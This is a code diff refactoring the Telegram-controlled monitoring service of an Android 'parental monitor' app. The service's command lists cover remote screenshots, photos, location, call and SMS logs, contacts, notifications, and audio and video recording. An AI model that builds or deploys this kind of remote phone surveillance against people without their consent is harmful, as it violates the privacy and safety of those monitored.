@@ -133,7 +133,7 @@ class MonitoringService : Service() {
         const val ACTION_START_MONITORING = "START_MONITORING"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
-        private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
+        private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval")
         private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/ping"
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
@@ -762,18 +762,6 @@ class MonitoringService : Service() {
         return true
     }
 
-    private fun clearOwnerMenuScope(previousOwner: Long) {
-        serviceScope.launch {
-            try {
-                val token = try { preferencesManager.botToken } catch (_: Exception) { "" }
-                if (token.isEmpty()) return@launch
-                val url = "https://api.telegram.org/bot$token/deleteMyCommands"
-                TelegramClient.api.deleteMyCommands(url, com.redeye.parentalmonitor.network.DeleteCommandsRequest(com.redeye.parentalmonitor.network.BotCommandScope("chat", previousOwner)))
-            } catch (_: Exception) {
-            }
-        }
-    }
-
     private val pairHintAt = java.util.concurrent.ConcurrentHashMap<String, Long>()
     private val pairAttemptAt = java.util.concurrent.ConcurrentHashMap<String, Long>()
     private val pingRate = object : LinkedHashMap<String, Long>(64, 0.75f, true) {
@@ -814,11 +802,7 @@ class MonitoringService : Service() {
 
     private fun isFreshLocation(last: android.location.Location): Boolean {
         return try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
-                android.os.SystemClock.elapsedRealtimeNanos() - last.elapsedRealtimeNanos < 120_000_000_000L
-            } else {
-                System.currentTimeMillis() - last.time < 120_000L
-            }
+            android.os.SystemClock.elapsedRealtimeNanos() - last.elapsedRealtimeNanos < 120_000_000_000L
         } catch (_: Exception) {
             false
         }
@@ -1097,7 +1081,7 @@ class MonitoringService : Service() {
                                     pairAttemptAt[senderId] = nowPair
                                 } catch (_: Exception) {
                                 }
-                                val startTokens = startArg.split(Regex("\\s+")).filter { it.isNotEmpty() }
+                                val startTokens = startArg.split(CMD_SPLIT_REGEX).filter { it.isNotEmpty() }
                                 val pairCode = try { preferencesManager.ensureOwnerPairCode() } catch (_: Exception) { "" }
                                 if (startTokens.size >= 2 && startTokens[0] == chatId && pairCode.isNotEmpty() && startTokens[1] == pairCode) {
                                     val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
@@ -2472,8 +2456,9 @@ class MonitoringService : Service() {
     }
 
     private suspend fun sendSmsPending(number: String, smsText: String, stagedAt: Long = 0L) {
-        val sentAction = "com.redeye.parentalmonitor.SMS_SENT_" + System.nanoTime() + "_" + java.util.UUID.randomUUID().toString()
-        val baseCode = Math.floorMod(smsReqSeq.addAndGet(1000000), 1000000000) + (java.util.UUID.randomUUID().hashCode() and 0xfff)
+        val uuid = java.util.UUID.randomUUID()
+        val sentAction = "com.redeye.parentalmonitor.SMS_SENT_" + System.nanoTime() + "_" + uuid.toString()
+        val baseCode = Math.floorMod(smsReqSeq.addAndGet(1000000), 1000000000) + (uuid.hashCode() and 0xfff)
         val delivered = CompletableDeferred<Boolean>()
         val smsManager = try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -2834,7 +2819,7 @@ class MonitoringService : Service() {
                     }
                     return false
                 }
-                val plain = message.replace(TAG_STRIP_REGEX, "").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&#x27;", "'").replace("&apos;", "'").replace("&amp;", "&")
+                val plain = Html.unescape(message)
                 if (plain != message) {
                     try {
                         val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
@@ -3457,7 +3442,7 @@ class MonitoringService : Service() {
         if (isCameraPolicyError(reason)) return "camera disabled by device policy (CAMERA_DISABLED)"
         val firstLine = (reason ?: "unknown error").lineSequence().firstOrNull()?.trim().orEmpty()
         if (firstLine.isEmpty()) return "unknown error"
-        val cleaned = firstLine.replace(Regex("(?i)connectHelper:\\d+:\\s*"), "")
+        val cleaned = firstLine.replace(CONNECT_HELPER_REGEX, "")
         return cleaned.take(160)
     }
 
